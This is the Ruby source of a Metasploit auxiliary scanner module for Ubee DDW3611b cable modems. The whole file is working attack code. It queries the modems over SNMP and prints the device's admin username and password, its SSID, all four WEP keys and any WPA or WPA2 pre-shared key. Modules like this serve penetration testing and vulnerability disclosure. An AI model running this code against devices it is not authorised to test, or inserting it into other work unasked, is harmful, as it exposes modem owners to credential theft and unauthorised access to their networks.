#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Ubee DDW3611b Cable Modem Wifi Enumeration',
      'Description' => "This module will extract wep keys and WPA preshared keys",
      'Author'      => ['Deral "PercentX" Heiland'],
      'License'     => MSF_LICENSE
    )

  end

  def run_host(ip)
      output_data = {}
    begin
      snmp = connect_snmp

      if snmp.get_value('1.2.840.10036.2.1.1.9.12') =~ /DDW3611/
           print_good("#{ip}")

           # System user account and Password
           username = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0')
           print_good("Username: #{username}")
           password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0')
           print_good("Password: #{password}")

      wifistatus = snmp.get_value('1.3.6.1.2.1.2.2.1.8.12')
        if wifistatus == 1
          ssid = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.3.12')
          print_line("WIFi is enabled")
          print_good("SSID: #{ssid}")

           #Wifi Security Version
           wifiversion = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.5.12')
             if wifiversion == "0"
               print_line("Open Access Wifi is Enabled")

             #Wep enabled
             elsif wifiversion == "1"
               weptype = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.2.12')
               if weptype == "2"
                 print_line("Device is configured for 128byte WEP")
                 wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.1')
                 key1 = "#{wepkey1}".unpack('H*')
                 print_good("WEP KEY1: #{key1}")
                 wepkey2 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.2')
                 key2 = "#{wepkey2}".unpack('H*')
                 print_good("WEP KEY2: #{key2}")
                 wepkey3 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.3')
                 key3 = "#{wepkey3}".unpack('H*')
                 print_good("WEP KEY3: #{key3}")
                 wepkey4 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.4')
                 key4 = "#{wepkey4}".unpack('H*')
                 print_good("WEP KEY4: #{key4}")
                 actkey = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.1.12')
                 print_good("Active Wep key is #{actkey}")

               elsif weptype == "1"
                 print_line("Device is configured for 64byte WEP")
                 wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.1')
                 key1 = "#{wepkey1}".unpack('H*')
                 print_good("WEP KEY1: #{key1}")
                 wepkey2 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.2')
                 key2 = "#{wepkey2}".unpack('H*')
                 print_good("WEP KEY2: #{key2}")
                 wepkey3 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.3')
                 key3 = "#{wepkey3}".unpack('H*')
                 print_good("WEP KEY3: #{key3}")
                 wepkey4 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.4')
                 key4 = "#{wepkey4}".unpack('H*')
                 print_good("WEP KEY4: #{key4}")
                 actkey = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.1.12')
                 print_good("Active Wep key is #{actkey}")

               else
                 print_line("FAILED")
               end

              #WPA enabled
              elsif wifiversion == "2"
                print_line("Device is configured for WPA ")
                wpapsk = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12')
                print_good("WPA PSK: #{wpapsk}")

              #WPA2 enabled
              elsif wifiversion == "3"
                print_line("Device is configured for WPA2")
                wpapsk2 = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12')
                print_good("WPA2 PSK: #{wpapsk2}")

              #WPA Enterprise enabled
              elsif wifiversion == "4"
                print_line("Device is configured for WPA enterprise")

              #WPA2 Enterprise enabled
              elsif wifiversion == "5"
                print_line("Device is configured for WPA2 enterprise")

              #WEP 802.1x enabled
              elsif wifiversion == "6"
                print_line("Device is configured for WEP 802.1X")
              else
                print_line("FAILED")
              end
         else
         print_line("WIFI is not enabled")
         end
    end


     rescue ::SNMP::UnsupportedVersion
     rescue ::SNMP::RequestTimeout
     rescue ::Interrupt
       raise $!
     rescue ::Exception => e
       print_error("#{ip} error: #{e.class} #{e}")
     disconnect_snmp
     end
  end
end
